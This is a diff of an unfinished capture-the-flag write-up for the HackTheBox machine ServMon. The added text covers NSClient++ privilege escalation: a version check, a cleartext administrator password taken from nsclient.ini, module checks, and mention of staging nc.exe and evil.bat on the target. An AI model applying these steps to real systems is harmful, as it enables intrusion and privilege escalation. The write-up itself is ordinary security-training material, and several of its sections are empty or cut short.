@@ -1,5 +1,7 @@
 # ServMon
 
+# User Flag 
+
 ## Enumeration
 
 NMAP Scan - All Ports:
@@ -193,7 +195,7 @@ The `Nathan` directory contained a txt file titled `Notes to do.txt`, which indi
 5) Place the secret files in SharePoint
 ```
 
-## HTTP Website 
+## HTTP Website - NVMS-1000 
 
 Navigating to `http://10.10.10.184` returns a login page for NVMS-1000, which was mentioned in the txt file titled `Notes to do.txt` found earlier. 
 
@@ -291,13 +293,59 @@ Directory of C:\Users\Nadine\Desktop
                2 Dir(s)   6,130,212,864 bytes free
 ```
 
-## Windows Privilege Escalation
+# Root Flag
 
-Used SCP to copy winpease script to target machine.
+## Web Application - NSClient++ 
+
+In the nmap port scan output, I can see that the machine has NSClient++ running over port 8443 with HTTPS protocol. There exists an exploit on [ExploitDB](https://www.exploit-db.com/exploits/46802) that outline how we can exploit this web application.
+
+Checking the version, it is `0.5.2.35`, which is vulnerable to the privilege escalation vulnerability:
 
 ```bash
-scp /usr/share/peass/winpeas/winPEASx64.exe nadine@10.10.10.184:C:/Users/Nadine/Desktop/winPEASx64.exe
+nadine@SERVMON c:\Program Files\NSClient++>nscp --version
+NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
 ```
+
+### NSClient++ - Login Page
+
+In the `nsclient.ini` configuration file, we can see some important information, including the administrator password and what hosst are allowed to access the machine.
+
+```bash
+; Undocumented key
+password = ew2x6SsGTxjRwXOT
+
+; Undocumented key
+allowed hosts = 127.0.0.1
+```
+
+If we try accessing the NSClient++ app, there does not appear to be any functionality available (i.e. nothing works). I can setup  set up an SSH tunnel to access the web app from localhost port 8443.
+
+```bash
+```
+
+
+
+###
+
+1. I started by SSHing into the machine via `nadine` account. Next, I grabbed the web administrator password located in `nsclient.ini`:
+
+```bash
+nadine@SERVMON c:\Program Files\NSClient++>nscp web password --display
+
+Current password: ew2x6SsGTxjRwXOT
+```
+
+2. I cheked that the modules `CheckExternalScripts` and `Scheduler` were enabled in `nsclient.ini`.
+
+```bash
+; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA
+Scheduler = enabled
+
+; CheckExternalScripts - Module used to execute external scripts
+CheckExternalScripts = enabled
+```
+
+3. I downloaded `nc.exe` and `evil.bat` to `c:\temp` from attacking machine.
 
 
 
